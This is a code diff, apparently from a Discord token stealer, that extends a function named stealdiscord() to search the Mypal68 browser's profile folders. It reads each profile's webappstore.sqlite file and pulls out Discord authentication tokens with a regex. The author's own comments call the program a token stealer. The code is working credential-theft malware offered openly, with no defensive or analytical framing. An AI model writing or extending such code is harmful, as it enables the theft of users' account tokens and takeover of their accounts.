@@ -496,7 +496,7 @@ def stealdiscord(): #stole this from my token stealer
     '3LibreWolf': os.path.join(roaming, 'LibreWolf', 'Profiles'),
     '3Zen': os.path.join(roaming, 'zen', 'Profiles'),
     '3Mullvad': os.path.join(roaming, 'Mullvad', 'MullvadBrowser', 'Profiles'),
-
+    '4Mypal': os.path.join(roaming, 'Mypal68', 'Profiles'),
     }
     #this is doing way too much for a token stealer
     for browser, path in paths.items():
@@ -578,6 +578,23 @@ def stealdiscord(): #stole this from my token stealer
                                 tokens.add(m)
                     except:
                         pass
+
+        elif browser.startswith('4'):
+            prof = os.listdir(path)
+            for profpth in prof:
+                tkdb = os.path.join(path, profpth, 'webappstore.sqlite')
+                if not os.path.exists(tkdb):
+                    continue
+                try:
+                    with open(tkdb, errors="ignore", encoding="utf-8") as f:
+                        gnw = f.read()
+                        match = re.findall(regex1, gnw)
+                        for m in match:
+                            tokens.add(m)
+                except:
+                    pass
+
+
     return tokens
     
 def accountdate(id):
